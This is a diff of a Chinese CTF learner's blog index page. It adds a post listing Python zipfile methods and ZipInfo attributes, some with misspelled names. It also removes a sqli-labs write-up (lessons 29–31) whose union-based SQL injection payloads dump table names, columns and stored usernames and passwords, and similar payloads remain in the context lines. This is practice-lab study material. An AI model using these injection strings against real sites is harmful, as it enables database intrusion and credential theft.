@@ -127,7 +127,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-count">35</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -167,6 +167,111 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/python%E4%B9%8Bzipfile%E5%BA%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/03/02/python%E4%B9%8Bzipfile%E5%BA%93/" class="post-title-link" itemprop="url">python之zipfile库</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-03-02 09:59:38 / Modified: 11:50:38" itemprop="dateCreated datePublished" datetime="2022-03-02T09:59:38+08:00">2022-03-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>**因为看到misc题目要手写脚本打开压缩包，于是想系统地学习一下python的zipfile模块，<del>顺便水一篇博客</del>**，<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43677350/article/details/84071552?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">参考zipfile zip文件操作</a></p>
+<h1 id="zipfile"><a href="#zipfile" class="headerlink" title="zipfile"></a>zipfile</h1><h2 id="zipfile-getinfo-name"><a href="#zipfile-getinfo-name" class="headerlink" title="zipfile.getinfo(name)"></a>zipfile.getinfo(name)</h2><p>功能：获取zip文档內指定对象文件的信息。返回一个zipfile.zipinfo对象，它包含文件的详细信息。</p>
+<h2 id="zipfile-infolist"><a href="#zipfile-infolist" class="headerlink" title="zipfile.infolist()"></a>zipfile.infolist()</h2><p>功能：获取zip文档內所有文件的信息返回一个zipfile.zipinfo列表</p>
+<h2 id="zipfile-namelist"><a href="#zipfile-namelist" class="headerlink" title="zipfile.namelist()"></a>zipfile.namelist()</h2><p>功能：获取zip文档內所有文件的名称列表。</p>
+<h2 id="zipfile-extract-memeber-path-pwd"><a href="#zipfile-extract-memeber-path-pwd" class="headerlink" title="zipfile.extract(memeber[,path[,pwd]])"></a>zipfile.extract(memeber[,path[,pwd]])</h2><p>功能：将zip文件內的制定文件解压到当前目录。</p>
+<p>参数：</p>
+<p>memeber      指定要解压的文件名称或对应的zipinfo对象</p>
+<p>path               指定解析文件保存的文件夹</p>
+<p>pwd                解压密码</p>
+<h2 id="zipfile-extractall-path-memebers-pwd"><a href="#zipfile-extractall-path-memebers-pwd" class="headerlink" title="zipfile.extractall([path[,memebers[,pwd]]])"></a>zipfile.extractall([path[,memebers[,pwd]]])</h2><p>功能：解压zip文档中的所有文件到当前目录。</p>
+<h2 id="zipfile-printdir"><a href="#zipfile-printdir" class="headerlink" title="zipfile.printdir()"></a>zipfile.printdir()</h2><p>功能：将zip文档內的信息打印到控制台上。</p>
+<h2 id="zipfile-setpassword-pwd"><a href="#zipfile-setpassword-pwd" class="headerlink" title="zipfile.setpassword(pwd)"></a>zipfile.setpassword(pwd)</h2><p>功能：设置zip文档的密码。</p>
+<h2 id="zipfile-read-name-pwd"><a href="#zipfile-read-name-pwd" class="headerlink" title="zipfile.read(name[,pwd])"></a>zipfile.read(name[,pwd])</h2><p>功能：获取zip文档指定文件的二进制数据。 </p>
+<h2 id="zipfile-getinfo-name-1"><a href="#zipfile-getinfo-name-1" class="headerlink" title="zipfile.getinfo(name)"></a>zipfile.getinfo(name)</h2><p>功能返回一个zipinfo对象，表示zip文档中相对应的文件信息。</p>
+<p>支持以下属性：</p>
+<p>zipinfo.filename           获取文件的名称</p>
+<p>zipinfo.date_time        获取文件最后的修改时间。返回一个包含6个元素的元组：（年，月，日，时，分，秒）</p>
+<p>zipinfo.compress_type  压缩类型</p>
+<p>zipinfo.comment           文档说明</p>
+<p>zipinfo.extr                    文件的扩展数据</p>
+<p>zipinfo.create_system   获取创建文件的系统</p>
+<p>zipinfo.create_version   获取创建文件的PKZIP版本</p>
+<p>zipinfo.extract_versio      获取创建、解压zip文档的PKZIP所需要的PKZIP版本</p>
+<p>zipinfo.reserved               预留字段，当前实现总是返回0</p>
+<p>zipinfo.flag_bites              zip标志位</p>
+<p>zipinfo.volume                  文件头的卷标</p>
+<p>zipinfo.internal_attr           内部属性</p>
+<p>zipinfo.external_attr           外部属性</p>
+<p>zipinfo.header_offset          文件头偏移位</p>
+<p>zipinfo.CRC                        未压缩文件的CRC-32</p>
+<p>zipinfo.conpress_size          获取压缩后的大小</p>
+<p>zipinfo.file_size                     获取未压缩文件的大小</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1098,117 +1203,6 @@
 <p>?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
 <p>?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p>
 <p>?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users–+</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/01/lesson29/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/02/01/lesson29/" class="post-title-link" itemprop="url">lesson29_31</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2022-02-01 19:57:27" itemprop="dateCreated datePublished" datetime="2022-02-01T19:57:27+08:00">2022-02-01</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-18 20:28:32" itemprop="dateModified" datetime="2022-02-18T20:28:32+08:00">2022-02-18</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="lesson-29"><a href="#lesson-29" class="headerlink" title="lesson 29"></a>lesson 29</h1><h2 id="首先是了解服务器两层架构"><a href="#首先是了解服务器两层架构" class="headerlink" title="首先是了解服务器两层架构"></a>首先是了解服务器两层架构</h2><p>参考<a target="_blank" rel="noopener" href="https://www.cnblog.com/lcamry/p/5762961.html">mysql注入天书之服务器</a></p>
-<p>总之就是要再去搭一个jsp的平台来</p>
-<p>同时打开phpstudy和jspstudy</p>
-<p>通过index.jsp访问到index.php生成的页面</p>
-<p>（buuctf里面的lesson29完全没意义，就跟lesson1一样，老坑人了，这里最好自己搭一个）</p>
-<p><img src="https://s2.loli.net/2022/02/13/496ZE8RYbSBfMUC.png" alt="QQ截图20220213145419.png"></p>
-<p>通过修改第一个id发现回显不会发生变化，且注入会被拦截</p>
-<p><img src="https://s2.loli.net/2022/02/13/7Df26N8sAyEFiRe.png" alt="QQ截图20220213150822.png"></p>
-<p>但是修改第二个id则会回显id对应的username和password，且超出数据 会报错</p>
-<p>所以第二个id处可注入</p>
-<p>联合查询，步骤参考lesson 1</p>
-<p>?id=1&amp;id=-1’ union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
-<p><img src="https://s2.loli.net/2022/02/13/9NX1JIVvGoyLdQ8.png" alt="QQ截图20220213151441.png"></p>
-<p>?id=1&amp;id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p>
-<p><img src="https://s2.loli.net/2022/02/13/IBRWVCXS9Z3LEvp.png" alt="QQ截图20220213152239.png"></p>
-<h1 id="lesson-30"><a href="#lesson-30" class="headerlink" title="lesson 30"></a>lesson 30</h1><p>和29差不多，不过是数据的包裹变成了双引号</p>
-<p><img src="https://s2.loli.net/2022/02/13/a4Cupvjb932Dtyl.png" alt="QQ截图20220213154154.png"></p>
-<p>查库</p>
-<p>?id=1&amp;id=-3”union select 1,database(),3–+</p>
-<p>查表</p>
-<p>?id=1&amp;id=-3”union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
-<p>查列</p>
-<p>?id=1&amp;id=-3”union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=’users’–+</p>
-<p>查字段</p>
-<p>?id=1&amp;id=-3”union select 1,database(),group_concat(concat_ws(‘@@’,username,password)) from security.users–+</p>
-<h1 id="lesson-31"><a href="#lesson-31" class="headerlink" title="lesson 31"></a>lesson 31</h1><p>和前面一样</p>
-<p>就是对数据的包裹变成了双引号加括号的形式</p>
-<p>?id=1&amp;id=-3”) union select 1,2,3–+</p>
-<p><img src="https://s2.loli.net/2022/02/13/voqCabJnfQHSrze.png" alt="QQ截图20220213155229.png"></p>
-<p>?id=1&amp;id=-3”) union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=’security’–+</p>
-<p>?id=1&amp;id=-3”) union select 1,database(),group_concat(column_name)from information_schema.columns where table_name=’users’–+</p>
-<p>?id=1&amp;id=-3”) union select 1,database(),group_concat(concat_ws(0x7e,username,password))from security.users–+</p>
 
       
     </div>
